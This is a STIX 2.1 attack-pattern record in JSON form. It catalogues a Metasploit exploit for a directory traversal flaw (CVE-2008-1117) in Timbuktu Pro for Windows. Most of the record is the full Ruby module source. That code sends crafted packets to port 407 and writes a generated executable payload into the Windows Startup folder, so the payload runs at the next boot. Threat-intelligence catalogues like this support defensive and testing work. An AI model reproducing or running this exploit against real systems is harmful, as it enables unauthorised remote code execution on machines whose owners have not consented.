{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--607b2113-9754-47f0-be73-11ad75d679a9",
    "created": "2024-08-14T16:47:47.88322Z",
    "modified": "2024-08-14T16:47:47.883225Z",
    "name": "Timbuktu Pro Directory Traversal/File Upload",
    "description": " This module exploits a directory traversal vulnerability in Motorola's Timbuktu Pro for Windows 8.6.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/motorola/timbuktu_fileupload.rb",
            "external_id": "timbuktu_fileupload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-1117"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Timbuktu Pro Directory Traversal/File Upload',\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability in Motorola's\n        Timbuktu Pro for Windows 8.6.5.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-1117' ],\n          [ 'OSVDB', '43544' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'DisableNops' => true,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic',  { } ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2008-05-10'))\n\n    register_options(\n      [\n        Opt::RPORT(407),\n        OptString.new('PATH', [ true, 'The path to place the executable.', '\\\\../../../Documents and Settings/All Users/Start Menu/Programs/Startup/']),\n      ])\n  end\n\n  def exploit\n    connect\n\n    exe  = rand_text_alpha(8) + \".exe\"\n    data = generate_payload_exe\n\n    pkt1 =  \"\\x00\\x01\\x6B\\x00\\x00\\xB0\\x00\\x23\\x07\\x22\\x03\\x07\\xD6\\x69\\x6D\\x3B\"\n    pkt1 << \"\\x27\\xA8\\xD0\\xF2\\xD6\\x69\\x6D\\x3B\\x27\\xA8\\xD0\\xF2\\x00\\x09\\x01\\x41\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x97\\x01\\x41\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x02\\x00\\x04\\xB7\\x1D\"\n    pkt1 << \"\\xBF\\x42\\x00\\x00\\x00\\x00\\x7F\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt1 << \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    pkt3 =  \"\\xFB\\x00\\x00\\x00\\x00\\x54\\x45\\x58\\x54\\x74\\x74\\x78\\x74\\xC2\\x32\\x94\"\n    pkt3 << \"\\xCC\\xC2\\x32\\x94\\xD9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x13\\x00\\x00\\x00\"\n    pkt3 << \"\\x00\\xFF\\xFF\\xFF\\xFF\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt3 << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt3 << [datastore['PATH'].length + exe.length].pack('C') + datastore['PATH'] + exe\n\n    print_status(\"Connecting to #{rhost} on port #{rport}...\")\n\n    sock.put(pkt1)\n    select(nil,nil,nil,0.15)\n\n    sock.put(\"\\xFF\")\n    select(nil,nil,nil,0.15)\n\n    sock.put(pkt3)\n    select(nil,nil,nil,0.15)\n\n    sock.put(\"\\xF9\\x00\")\n    select(nil,nil,nil,0.15)\n\n    print_status(\"Sending EXE payload '#{exe}' to #{rhost}:#{rport}...\")\n    sock.put(\"\\xF8\" + [data.length].pack('n') + data)\n    select(nil,nil,nil,5)\n\n    sock.put(\"\\xF7\")\n    select(nil,nil,nil,0.15)\n\n    sock.put(\"\\xFA\")\n    select(nil,nil,nil,0.15)\n\n    sock.put(\"\\xFE\")\n    select(nil,nil,nil,0.08)\n\n    print_status(\"Done!\")\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-05-10",
    "x_mitre_platforms": [
        "win'"
    ]
}